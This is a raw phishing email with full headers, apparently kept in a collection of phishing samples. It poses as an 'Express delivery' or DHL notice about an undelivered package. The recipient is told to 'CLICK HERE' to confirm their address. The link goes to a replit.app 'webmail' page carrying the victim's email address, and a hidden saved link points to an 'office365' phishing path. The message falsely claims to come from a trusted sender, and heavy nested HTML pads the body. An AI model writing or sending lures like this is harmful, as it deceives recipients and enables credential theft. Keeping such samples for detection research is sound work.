@@ -1,0 +1,496 @@
+Return-Path: bio@whoochieenterprise.eu
+Delivered-To: jose@monkey.org
+X-FDA: 83037629388.09.7453745
+Received: from mail.whoochieenterprise.eu (mail.whoochieenterprise.eu
+ [166.88.142.231])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id C7A4D120002
+	for <jose@monkey.org>; Thu, 23 Jan 2025 05:45:32 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;
+	dkim=pass header.d=whoochieenterprise.eu header.s=dkim header.b=C9KbKr7R;
+	dmarc=pass (policy=quarantine) header.from=whoochieenterprise.eu;
+	spf=pass (imf03.b.hostedemail.com: domain of bio@whoochieenterprise.eu
+ designates 166.88.142.231 as permitted sender)
+ smtp.mailfrom=bio@whoochieenterprise.eu
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1737611132;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=eJpc7gsENEMYR68031hpy0h5PXFqrQWIKLXrYjKJ4UY=;
+	b=lebMXalvazzXSyLHHPU2SKqgqZkylfpYGE6RozG0e3ZiFTPF4whFC500eA5mXmfJ15BICf
+	KQFRPXDeSsGKPdhqUbAGMMAr8LANGYFpWnlutVcH/SPW+G3Hd7Skriy8zWW5OTcO0onIu0
+	92mOwtRIGE3PKtrpVwpNnZAsBwDoFX8=
+ARC-Authentication-Results: i=1;
+	imf03.b.hostedemail.com;
+	dkim=pass header.d=whoochieenterprise.eu header.s=dkim header.b=C9KbKr7R;
+	dmarc=pass (policy=quarantine) header.from=whoochieenterprise.eu;
+	spf=pass (imf03.b.hostedemail.com: domain of bio@whoochieenterprise.eu
+ designates 166.88.142.231 as permitted sender)
+ smtp.mailfrom=bio@whoochieenterprise.eu
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1737611132; a=rsa-sha256;
+	cv=none;
+	b=SvrQHBI09LqfSOOcIaDJ+nyEaYUAze5C4WqWgIQ13w4IWkE8UNMleGwQf3yDETeF3/L1jU
+	bH5tlCfZvMG2CkMb1CAqJkY4ypKbU6BouTIuRkADQoMTRA4Mw3F5dejYf5Jz3RnYyS8gPr
+	ZvjMJLxqFd0BD/MuHekcL6CwEnUHicU=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=whoochieenterprise.eu; s=dkim; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=eJpc7gsENEMYR68031hpy0h5PXFqrQWIKLXrYjKJ4UY=; b=C9KbKr7Rfmawj+3ionXVjMfwJu
+	wVu1HXVtOUmPcd4Nl+fp9dfHKsasFGGmrcDA7+48/NKme0RyctuL7eYgB3PER3EpEczqoTFLWcS4e
+	wayy0bYkpAzIIDZP3FhYW88LXwLAFNCjAu3d6Q3orx3u8DxlfcrCe4pKzSmBySMET1Mg=;
+Received: from [188.119.149.162]
+	by mail.whoochieenterprise.eu with esmtpsa  (TLS1.3) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <bio@whoochieenterprise.eu>)
+	id 1taq1y-003ZKw-0w
+	for jose@monkey.org;
+	Thu, 23 Jan 2025 05:45:30 +0000
+From: Express delivery <bio@whoochieenterprise.eu>
+To: jose@monkey.org
+Subject: AWB ***** 038430098 Package arrival notice
+Date: 23 Jan 2025 05:45:29 +0000
+Message-ID: <20250123054529.0E31C4BAB4CFAC0B@whoochieenterprise.eu>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-SPF-Fail: YES
+X-Rspamd-Queue-Id: C7A4D120002
+X-Stat-Signature: zzfaxzwskq5m3mke6rrmedff9y4pixr9
+X-Rspam-User: 
+X-Spam-Status: No, score=0.31
+X-Rspamd-Server: rspam12
+X-HE-Tag: 1737611132-635137
+X-HE-Meta: 
+ U2FsdGVkX19br9E036mv7SEMPjGyrzqWYb4l5U9vXeiB8qRvp0huk3Q4+BJkAYV7lZa7JvaXbMHnDWEm1fvLtB3tmbpyqd8grninrx+vcL44d6JmHbzuNP9n2qH1jvwXV6wi+pePWq0T2OwavB1ne4jd1IGqeVBKiIaSBucduunX2iU6wwlXX7W6wVJAbee/zyKbJM1LJ3c2UAZTHmhJbteMTQkxsOeOe/9e8MGEipvWlsMV7G06h+cvDyhWmtD7ZQbtmj7ash7mD0ACqY0gMy9RgAAhTxGyM4JzIXe+CUHtm0RmfvJjk2j59rETp8xnkragJ99/9ltAFyKBCJr9VPULURFjm3/iy/M7VIQwav3QGE1Sjqo9J2tJsaMseWcrDRlxTFHHtxngeAdXyIEO+GH8XyJSlJQQ9XylKDHL8qk/l8xmCLQGqp/XpOQKnpJmKfsP2WQGbSeLsi+dqQ8aCpV8EuHEItI4qwOv+ofxlNqXV+pfXS7pCSZRh22MD5xwj6S0cJHzgZjwohR/M40lpQ9leASPFra1OFruWxJQqEO6s5Wnf8i6N8aZtKwL2x0sQBRJPYfhdqNatb97IDt/+Q13p7gVWo7U5mjKaoWd81+W6CH6d5ShmKeymkcPc5KZa4ZBRLbV6uJ/jwQ3E2cZwoT3LW+vki6KHjuCLYKVL4oWY2q2RARI7AOEK68TM8tBfbTMr8I6wP2H5wtFzVoDNnw/nuJLhUJiko+TU5+yZGQIDZofKIcIqttVYNrYpem7DhyyhBY8URsXi3IA3P4LgWuA6x8cfuPkpSvR6xeCLCs8tXOOv8TmO1V2MLSj0ofo9AmI8Z2goOeDc++imc2PuiZrtOeLGdVT/asQCaX37wUQTCFinHHoHC4rD602aTAbAEQtbQnr2rLrRGhiUIXNLsDvAEO6u2RxSP6G8x11DSJiytMIlbWpDGlfsbpv/RQ4uflM6eExcPtId4btqWFiTN2CZtv
+ nzOO4b0SZxNchSLCB094aicgUMvYXCR6j41i25SGdtYbIA7HXq9i0gwkWm8aEbq1FrPQGhREV4Znm+CeQnztMvIZNmGbMUvzsv3iKxRh1aI/SSS6ivtVAEa64YAeXU/1+cB+YeyXM/9v4Z70EII5iTen/CTQ2HHUvfLeRSM/nLV89qb8=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 18
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3DISO-8859-=
+1">
+<title></title>
+</head>
+<body>
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(0, 0, 0); text-transform: none; line-height: inherit=
+; text-indent: 0px; font-family: "arial","helvetica",sans-serif,serif,"emoj=
+ifont"; font-size: 16px; font-style: normal; font-weight: 400; word-spacing=
+: 0px; vertical-align: baseline; white-space: normal; background-color: rgb=
+(255, 255, 255);'>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: inherit; line-height: inherit; font-family: "comic sans =
+ms","chalkboard",cursive,serif,"emojifont"; font-size: inherit; font-style:=
+ inherit; font-variant: inherit; font-weight: inherit; vertical-align: base=
+line;'>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: inherit; line-height: inherit; font-family: "verdana",se=
+rif,"emojifont"; font-size: inherit; font-style: inherit; font-variant: inh=
+erit; font-weight: inherit; vertical-align: baseline;'>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<p style=3D"line-height: 13.5pt; margin-top: 0px; margin-bottom: 0px;"><fon=
+t color=3D"#999999" face=3D"Calibri,Arial,Helvetica,sans-serif,serif,EmojiF=
+ont" style=3D"font-size: inherit; font-style: inherit; font-weight: inherit=
+;"><span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px cur=
+rentColor; border-image: none; color: inherit; vertical-align: baseline; fo=
+nt-size-adjust: inherit; font-stretch: inherit; background-color: rgb(56, 1=
+18, 29);"><strong>&nbsp;</strong></span></font>
+<font face=3D"Calibri,Arial,Helvetica,sans-serif,serif,EmojiFont" style=3D"=
+color: inherit; font-size: inherit; font-style: inherit; font-weight: inher=
+it;"><span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px c=
+urrentColor; border-image: none; color: inherit; vertical-align: baseline; =
+font-size-adjust: inherit; font-stretch: inherit; background-color: rgb(217=
+, 234, 211);">&nbsp;
+&nbsp;This message is sent by a trusted sender<font size=3D"2"><span lang=
+=3D"en" style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curr=
+entColor; border-image: none; color: inherit; vertical-align: baseline; fon=
+t-size-adjust: inherit; font-stretch: inherit;">.</span></font></span></fon=
+t></p>
+</div>
+</div>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;"><span style=3D"margin: 0px; pa=
+dding: 0px; border: 0px currentColor; border-image: none; color: inherit; l=
+ine-height: inherit; font-family: verdana,helvetica,sans-serif,serif,emojif=
+ont; font-size: 13px; font-style: inherit; font-variant: inherit; font-weig=
+ht: inherit; vertical-align: baseline;"><br>
+<span style=3D"font-weight: bold;">Hello! (jose@monkey.org)</span><br>
+<br>
+Your package arrived at our postal service on <strong>Jan 18th, 2025</stron=
+g>.
+Our courier agent could not deliver the packages due to incorrect
+address data.&nbsp;Shipping in the registration package.</span></div>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;"><br>
+</div>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div title=3D"Rich Text Editor, TABLE1_HEADING" style=3D"font: inherit; mar=
+gin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color=
+: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretc=
+h: inherit;"><strong style=3D"margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: inherit; line-height: inherit; font-fami=
+ly: inherit; font-size: inherit; font-style: inherit; font-variant: inherit=
+; font-weight: bold; vertical-align: baseline;">
+<font color=3D"#ff0000">DELIVERY INFORMATION</font></strong></div>
+<table style=3D'margin: 0px; line-height: inherit; font-family: "verdana","=
+geneva",sans-serif; font-size: 13px; font-style: inherit; font-variant: inh=
+erit; font-weight: inherit;'>
+<tbody style=3D"width: 337px;">
+<tr>
+<td width=3D"150" align=3D"left" style=3D'font-family: "arial",sans-serif; =
+white-space: normal !important;'>consignment note no.</td>
+<td align=3D"left" style=3D'font-family: "arial",sans-serif; white-space: n=
+ormal !important;'>***** 038430098</td>
+</tr>
+<tr>
+<td align=3D"left" style=3D'font-family: "arial",sans-serif; white-space: n=
+ormal !important;'>Scheduled date for delivery</td>
+<td align=3D"left" style=3D'font-family: "arial",sans-serif; white-space: n=
+ormal !important;'><strong>1/23/2025 5:45:29 a.m.</strong></td>
+</tr>
+</tbody>
+</table>
+<table style=3D'margin: 0px; line-height: inherit; font-family: "verdana","=
+geneva",sans-serif; font-size: 13px; font-style: inherit; font-variant: inh=
+erit; font-weight: inherit;'>
+<tbody style=3D"width: 314px;">
+<tr>
+<td style=3D'font-family: "arial",sans-serif; white-space: normal !importan=
+t;'>
+<table style=3D"font: inherit; margin: 0px; font-size-adjust: inherit; font=
+-stretch: inherit;">
+<tbody style=3D"width: 314px;">
+<tr>
+<td width=3D"150" align=3D"left" style=3D"white-space: normal !important;">=
+
+<div title=3D"Rich Text Editor, MOBILE_LABEL" style=3D"font: inherit; margi=
+n: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: =
+inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch:=
+ inherit;"><strong>Delivery
+address</strong></div>
+</td>
+<td align=3D"left" style=3D"white-space: normal !important;">
+<table style=3D"font: inherit; margin: 0px; font-size-adjust: inherit; font=
+-stretch: inherit;">
+<tbody style=3D"width: 314px;">
+<tr>
+<td align=3D"left" style=3D"white-space: normal !important;"><em style=3D"m=
+argin: 0px; padding: 0px; border: 0px currentColor; border-image: none; col=
+or: inherit; line-height: inherit; font-family: inherit; font-size: inherit=
+; font-style: italic; font-variant: inherit; font-weight: inherit; vertical=
+-align: baseline;"><strong>*************
+confidential</strong></em></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;"><font color=3D"#ff0000" face=
+=3D"Gill Sans MT"><strong>Confirm your receipt of
+documents for DHL tracking.</strong></font><span style=3D"margin: 0px; padd=
+ing: 0px; border: 0px currentColor; border-image: none; color: inherit; lin=
+e-height: inherit; font-family: verdana,helvetica,sans-serif,serif,emojifon=
+t; font-size: 13px; font-style: inherit; font-variant: inherit; font-weight=
+: inherit; vertical-align: baseline;"><font face=3D"Gill Sans MT">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: inherit; fo=
+nt-size: 12pt; font-style: inherit; font-variant: inherit; font-weight: inh=
+erit; vertical-align: baseline;">&nbsp;</span></font></span></div>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;"><br>
+</div>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div><big><span style=3D"margin: 0px; padding: 0px; border: 0px currentColo=
+r; border-image: none; color: inherit; line-height: inherit; font-family: v=
+erdana,helvetica,sans-serif,serif,emojifont; font-size: 13px; font-style: i=
+nherit; font-variant: inherit; font-weight: inherit; vertical-align: baseli=
+ne;"><strong><font face=3D"Tahoma, serif, EmojiFont" style=3D'font-family: =
+"tahoma"; font-size: 13.33px;'>Please&nbsp;</font><big>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: rgb(34, 34, 34); line-height: inherit; font-family: tah=
+oma,serif,emojifont; font-size: 13.33px; font-style: inherit; font-variant:=
+ inherit; font-weight: inherit; vertical-align: baseline;"><font color=3D"#=
+ffff00">
+<a style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentCo=
+lor; border-image: none; vertical-align: baseline; font-size-adjust: inheri=
+t; font-stretch: inherit;" href=3D"https://webmail-2096-dbdf425-8bf3-41e8-9=
+8s7-a65b0e601fd8-0a0-3fbo5ew52c.replit.app/#jose@monkey.org" rel=3D"noopene=
+r noreferrer" data-cke-saved-href=3D"https://www.careerboostconsulting.com/=
+wp-content/plugins/geobin-features/post-type/method/office365/">CLICK HERE<=
+/a></font></span></big>
+<font face=3D"Tahoma, serif, EmojiFont" style=3D'font-family: "tahoma"; fon=
+t-size: 13.33px;'> to confirm accordingly if your
+address is correct, before we submit to our outlet office for dispatch
+to your destination.</font></strong></span></big></div>
+<div><br>
+</div>
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: inherit; line-height: inherit; font-family: "arial","hel=
+vetica",sans-serif,serif,"emojifont"; font-size: inherit; font-style: inher=
+it; font-variant: inherit; font-weight: inherit; vertical-align: baseline;'=
+>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: inherit; line-height: inherit; font-family: "comic sans =
+ms","chalkboard",cursive,serif,"emojifont"; font-size: inherit; font-style:=
+ inherit; font-variant: inherit; font-weight: inherit; vertical-align: base=
+line;'><br>
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(0, 0, 0); text-transform: none; line-height: inherit=
+; text-indent: 0px; font-family: "verdana",serif,"emojifont"; font-size: 12=
+px; font-style: normal; font-weight: 400; word-spacing: 0px; vertical-align=
+: baseline; white-space: normal; background-color: rgb(255, 255, 255);'><br=
+>
+<font face=3D"Gill Sans MT" size=3D"3"><strong>Thanks so your
+sponsorship&nbsp;</strong></font><br>
+<br>
+<br style=3D"color: black;">
+<font face=3D"Gill Sans MT" style=3D"color: black;"><span style=3D"margin: =
+0px; padding: 0px; border: 0px currentColor; border-image: none; color: inh=
+erit; line-height: inherit; font-family: inherit; font-size: 12pt; font-sty=
+le: inherit; font-variant: inherit; font-weight: inherit; vertical-align: b=
+aseline;"><strong>Regards,<br>
+Mathew Chen<br>
+Express Delivery Team<br>
+</strong></span></font><span style=3D"margin: 0px; padding: 0px; border: 0p=
+x currentColor; border-image: none; color: rgb(128, 128, 128); line-height:=
+ inherit; font-family: tahoma,serif,emojifont; font-size: 13.33px; font-sty=
+le: inherit; font-variant: inherit; font-weight: inherit; vertical-align: b=
+aseline;"><strong></strong></span></div>
+
+
+
+</div></div></div></div></div></div></div></div></div></div></div></div></d=
+iv></div></div></div></div></div></div></div></div></div></div></div></div>=
+</div></div></div></div></div></div></div></div></div></div></div></div></d=
